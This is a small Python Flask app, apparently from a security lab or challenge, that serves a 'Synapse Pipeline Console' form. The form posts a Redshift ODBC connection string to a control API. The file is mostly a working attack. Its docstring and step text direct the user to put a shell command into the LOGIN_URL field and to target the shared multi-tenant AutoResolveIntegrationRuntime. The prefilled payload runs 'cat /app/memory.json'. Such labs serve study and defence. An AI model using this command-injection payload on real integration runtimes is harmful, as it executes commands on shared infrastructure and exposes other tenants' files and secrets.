"""Submit a malicious ODBC connection string to the shared integration runtime."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
API = os.environ.get("API_URL", "http://control-api:5000")

HTML = """<h1>Synapse Pipeline Console</h1>
<p>Step 1: read the control-plane docs; note the <b>AutoResolveIntegrationRuntime</b>
is a shared multi-tenant pool.</p>
<p>Step 2: submit a pipeline whose Redshift ODBC <code>LOGIN_URL</code> contains a
shell command; swap the runtime name to the shared one.</p>
<form method="post">
  runtime_name: <input name="runtime" size="36" value="AutoResolveIntegrationRuntime"><br>
  connection_string: <input name="conn" size="90"
    value="Driver={Redshift};plugin_name=BrowserSAML;LOGIN_URL={echo x; cat /app/memory.json}"><br>
  <button>Submit</button>
</form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/", methods=["POST"])
def submit():
    body = {
        "driver": "Redshift",
        "connection_string": request.form.get("conn", ""),
        "runtime_name": request.form.get("runtime", "IntegrationRuntime1"),
    }
    try:
        r = requests.post(f"{API}/pipeline", json=body, timeout=15)
        return HTML.replace("{{out}}", f"HTTP {r.status_code}\n{r.text}")
    except Exception as e:
        return HTML.replace("{{out}}", f"error: {e}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
